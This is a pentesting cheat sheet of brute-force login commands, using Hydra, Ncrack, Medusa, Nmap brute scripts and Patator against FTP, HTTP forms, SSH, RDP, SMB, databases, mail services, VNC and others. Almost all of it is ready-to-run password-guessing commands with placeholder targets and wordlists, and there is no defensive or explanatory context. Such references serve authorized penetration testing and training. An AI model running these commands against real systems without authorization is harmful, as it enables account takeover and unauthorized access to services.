# Tools

- Hydra
- Nmap
- John
- Medusa
- Patator
- Ncrack

---

# FTP

```shell
hydra -l <user> -P <wordlist> <IP_ADDR> ftp
ncrack -p 21 --user <user> -P <wordlist> <IP_ADDR>
medusa -u <user> -P <wordlist> -h <IP_ADDR> -M ftp
```


# HTTP Basic Auth

```shell
hydra -l <user> -P <wordlist> <URL> http-get <direction>
```

# HTTP POST Form

```shell
hydra -l <user> -P <wordlist> <URL>  http-post-form "/login.php:user=^USER^&password=^PASS^&submit=Login:Username or password is incorrect!"
```

# SSH

```shell
hydra -l <user> -P <wordlist> ssh://<IP_ADDR>
ncrack -p 22 --user <user> -P <wordlist> <IP_ADDR>
medusa -u <user> -P <wordlist> -h <IP_ADDR> -M ssh
```

# SNMP

```shell
nmap -sU --script snmp-brute --script-args snmp-brute.communitiesdb=<wordlist> <IP_ADDR>
hydra -P <wordlist> <IP_ADDR> snmp
```

# RDP

```shell
hydra -l <user> -P <wordlist> rdp://<IP_ADDR>
ncrack --user <user> -P <wordlist> rdp://<IP_ADDR>
```

# LDAP

```shell
nmap -p 389 --script ldap-brute <IP_ADDR>
hydra -l <user> -P <wordlist> <IP_ADDR> ldap2
```

# MongoDB

```shell
nmap -p 27017 --script mongodb-brute <IP_ADDR>
```

# MySQL

```shell
hydra -l <user> -P <wordlist> <IP_ADDR> mysql
```

# PostgreSQL

```shell
nmap -p 5432 --script pgsql-brute --script-args userdb=<user_file>,passdb=<wordlist> <IP_ADDR>
hydra -l <user> -P <wordlist> <IP_ADDR> postgres
medusa -u <user> -P <wordlist> -h <IP_ADDR> -M postgres
ncrack --user <user> -P <wordlist> <IP_ADDR>:5432
patator pgsql_login host=<IP_ADDR> user=FILE0 0=<user_file> password=FILE1 1=<wordlist>
```

# POP3

```shell
hydra -l <user> -P <wordlist> <IP_ADDR> pop3
```

# Redis

```shell
nmap -p 6379 --script redis-brute <IP_ADDR>
hydra -P <wordlist> <IP_ADDR> redis
```

# SMB

```shell
nmap -p 445 --script smb-brute <IP_ADDR>
hydra -l <user> -P <wordlist> <IP_ADDR> smb
```

# Telnet

```shell
hydra -l <user> -P <wordlist> <IP_ADDR> telnet
ncrack -p 23 --user <user> -P <wordlist> <IP_ADDR>
medusa -u <user> -P <wordlist> -h <IP_ADDR> -M telnet
```

# VNC

```shell
hydra -l <user> -P <wordlist> -s <PORT> <IP_ADDR> vnc
medusa -u <user> -P <wordlist> -h <IP_ADDR> -M vnc
ncrack --user <user> -P <wordlist> <IP_ADDR>:<PORT>
```

# SMTP

```shell
hydra -P <wordlist> <IP_ADDR> smtp
```

